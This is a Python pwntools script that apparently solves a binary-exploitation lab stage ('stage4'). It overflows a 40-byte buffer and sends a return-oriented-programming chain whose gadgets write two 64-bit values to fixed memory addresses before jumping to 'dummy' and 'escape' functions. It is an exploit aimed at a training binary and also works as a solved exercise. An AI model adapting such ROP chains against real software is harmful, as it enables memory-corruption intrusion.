import sys
from pwn import process, context, p64, ELF
import time
import re

target = './stage4'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

# Receive output from program and print it in ASCII
output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
dummy = context.binary.symbols['dummy']
escape = context.binary.symbols['escape']
poprax = context.binary.symbols['gadget1']
poprcx = context.binary.symbols['gadget2']
movraxrcx = context.binary.symbols['gadget3']


input = b'a'*40

input += p64(poprax)
input += p64(0x14e84bd1fcde66fb)
input += p64(poprcx)
input += p64(0x405060)
input += p64(movraxrcx)

input += p64(poprax)
input += p64(0xbaa0f95d3a428414)
input += p64(poprcx)
input += p64(0x405068)
input += p64(movraxrcx)
input += p64(dummy)
input += p64(escape)
####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))







